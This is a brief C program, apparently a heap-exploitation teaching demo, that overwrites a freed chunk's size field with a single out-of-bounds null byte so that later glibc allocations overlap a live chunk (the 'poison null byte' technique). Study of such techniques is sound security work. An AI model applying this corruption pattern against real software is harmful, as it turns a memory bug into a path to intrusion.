#include <stdio.h>
#include <unistd.h>
#include <malloc.h>

int main(void)
{
    void *A,*B,*C;
    void *B1,*B2;
   
    A=malloc(0x100);
    B=malloc(0x208);
    C=malloc(0x100);
    printf("A:  %p  B:  %p  C:  %p\n", A, B, C);

    free(B);
    printf("\nfree B over!\n\n");
    ((char *)A)[0x104]='\x00';
    printf("overwrite chunk B's size\n");
    B1=malloc(0x100);
    B2=malloc(0x80);
    printf("\nB1: %p  B2: %p\n\n", B1, B2);

    free(B1);
    free(C);
    void *D = malloc(0x200);
    printf("D:  %p\n", D);   
}
